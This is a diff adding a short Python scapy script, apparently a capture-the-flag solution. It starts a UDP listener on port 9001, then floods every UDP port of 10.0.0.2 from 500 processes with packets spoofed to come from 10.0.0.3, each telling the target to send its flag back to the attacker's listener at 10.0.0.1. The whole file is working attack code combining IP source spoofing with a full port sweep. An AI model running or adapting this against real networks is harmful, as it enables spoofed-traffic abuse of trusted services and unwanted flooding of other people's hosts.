@@ -1,0 +1,33 @@
+from scapy.all import *
+from multiprocessing import Pool
+import threading
+conf.verb = 0
+
+def listener():
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    server_socket.bind(("0.0.0.0", 9001))
+    while True:
+        try:
+            client_message, (client_host, client_port) = server_socket.recvfrom(1024)
+            msg = client_message.decode().strip()
+            if "pwn" in msg:
+                print(f"Got the flag : {msg}")
+                exit()
+
+
+        except ConnectionError:
+            continue
+
+
+def udpsend(p):
+    sendp(Ether() / IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=p) / b"FLAG:10.0.0.1:9001", verbose=False)
+
+
+t = threading.Thread(target=listener,args=[])
+t.start()
+print("Listener started")
+time.sleep(2)
+
+print("Sending UDP")
+with Pool(processes=500) as pool:
+    pool.map(udpsend, range(1, 65536))
